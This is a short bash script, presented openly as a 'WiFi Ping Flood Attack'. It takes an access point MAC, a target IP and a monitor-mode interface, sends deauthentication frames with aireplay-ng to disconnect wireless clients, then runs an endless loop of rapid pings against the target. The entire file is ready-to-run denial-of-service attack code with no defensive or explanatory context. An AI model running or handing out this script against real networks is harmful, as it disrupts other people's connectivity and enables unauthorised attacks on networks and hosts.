#!/bin/bash
# WiFi Ping Flood Attack (Requires monitor mode)
# Usage: ./wifi_ping_flood.sh <AP_MAC> <TARGET_IP> <INTERFACE>

if [ -z "$1" ] || [ -z "$2" ] || [ -z "$3" ]; then
    echo "Usage: $0 <AP_MAC> <TARGET_IP> <MONITOR_INTERFACE>"
    exit 1
fi

AP_MAC=$1
TARGET_IP=$2
INTERFACE=$3

# Step 1: Deauth clients to force reconnection (optional)
echo "[*] Sending deauth packets to disrupt clients..."
aireplay-ng --deauth 10 -a $AP_MAC $INTERFACE &> /dev/null &

# Step 2: Ping flood the target IP
echo "[*] Starting ping flood on $TARGET_IP..."
while true; do
    ping -c 100 -i 0.01 $TARGET_IP
done
